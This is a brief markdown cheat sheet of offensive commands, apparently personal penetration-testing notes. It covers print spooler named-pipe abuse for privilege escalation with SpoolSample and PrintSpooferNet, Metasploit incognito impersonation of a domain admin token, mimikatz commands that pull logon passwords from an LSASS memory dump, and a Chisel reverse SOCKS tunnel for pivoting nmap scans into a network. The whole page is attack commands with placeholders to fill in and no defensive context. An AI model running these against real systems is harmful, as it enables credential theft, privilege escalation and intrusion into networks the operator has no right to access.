# Windows Credential

## SpoolSV Exploitation
```powershell
SpoolSample.exe [Host Machine] [Target Pipe] <appsrv01\test>
PrintSpooferNet.exe [Target Pipe] <\\.\pipe\test\pipe\spoolss>
```
## Incognito Impersonation Metasploit
```powershell
#Inside Metasploit 
load incognito
list_tokens -u
impersonate_token corp1\\admin
getuid
```

## MiniDump
```powershell
#MiniDump.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

# Network 

## Chisel Tunnel
```Powershell
#Server Side
./chisel server -p [Port] --reverse

#Client Side
./chisel client [Server IP Address]:[Port] R:[Remote Port]:socks

#Server Side
proxychains4 nmap [IP Address]
```
